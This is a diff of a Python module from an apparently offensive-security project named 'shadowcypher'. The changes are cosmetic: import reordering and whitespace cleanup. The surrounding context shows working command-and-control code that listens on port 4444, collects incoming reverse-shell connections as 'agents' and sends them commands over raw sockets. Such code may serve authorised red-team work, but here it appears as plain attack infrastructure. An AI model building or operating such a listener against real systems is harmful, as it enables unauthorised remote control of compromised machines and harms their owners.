@@ -7,10 +7,11 @@ import socket
 import threading
 import time
 from datetime import datetime
-from typing import Dict, List, Optional, Any
+from typing import Dict, List, Optional
 
-from shadowcypher.core.logger import logger
 from shadowcypher.core.bus import bus
+from shadowcypher.core.logger import logger
+
 
 class C2Session:
     """A persistent high-fidelity shell session via raw socket."""
@@ -22,7 +23,7 @@ class C2Session:
         self.last_seen = datetime.now()
         self.status = "ACTIVE"
         self.history: List[str] = []
-        
+
         # Non-blocking config
         self.sock.settimeout(0.5)
 
@@ -33,7 +34,7 @@ class C2Session:
             self.sock.send(full_cmd)
             self.last_seen = datetime.now()
             self.history.append(cmd)
-            
+
             # Attempt to read response (Best effort)
             time.sleep(0.5) # Wait for network latency
             resp = self.sock.recv(4096).decode(errors="replace")
@@ -58,7 +59,7 @@ class RelayManager:
     Shadow-Hive Control Unit.
     Manages concurrent TCP reverse-shell sessions with isolation and multiplexing.
     """
-    
+
     _instance = None
     _lock = threading.Lock()
 
@@ -72,7 +73,7 @@ class RelayManager:
     def __init__(self, bind_ip: str = "0.0.0.0", bind_port: int = 4444):  # nosec B104
         if self._initialized:
             return
-        
+
         self.sessions: Dict[str, C2Session] = {}
         self.bind_ip = bind_ip
         self.bind_port = bind_port
@@ -84,12 +85,12 @@ class RelayManager:
         """Invoke the background C2 listener thread with optional bind overrides."""
         if self._active:
             return
-        
+
         if port:
             self.bind_port = port
         if bind_ip:
             self.bind_ip = bind_ip
-        
+
         name = f"C2-HiveListener-{self.bind_port}"
         thread = threading.Thread(target=self._run_server, name=name, daemon=True)
         thread.start()
@@ -102,18 +103,18 @@ class RelayManager:
             self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.server_sock.bind((self.bind_ip, self.bind_port))
             self.server_sock.listen(10)
-            
+
             while self._active:
                 conn, addr = self.server_sock.accept()
                 sid = f"SH-{len(self.sessions) + 1:1d}"
                 session = C2Session(sid, addr[0], conn)
-                
+
                 with self._lock:
                     self.sessions[sid] = session
-                    
+
                 logger.info("c2", f"NODE_ACQUIRED: {sid} FROM {addr[0]}")
                 bus.publish("module_log", {"module": "c2", "text": f"New agent connected: {sid} ({addr[0]})", "level": "SUCCESS"})
-                
+
         except Exception as e:
             if self._active:
                 logger.error("c2", f"C2_SERVER_CRITICAL: {str(e)}")
@@ -124,7 +125,7 @@ class RelayManager:
         session = self.sessions.get(sid)
         if not session:
             return "[ERROR] SESSION_INVALID"
-        
+
         logger.info("c2", f"EXEC_CMD: {sid} -> {cmd[:32]}...")
         return session.send(cmd)
 
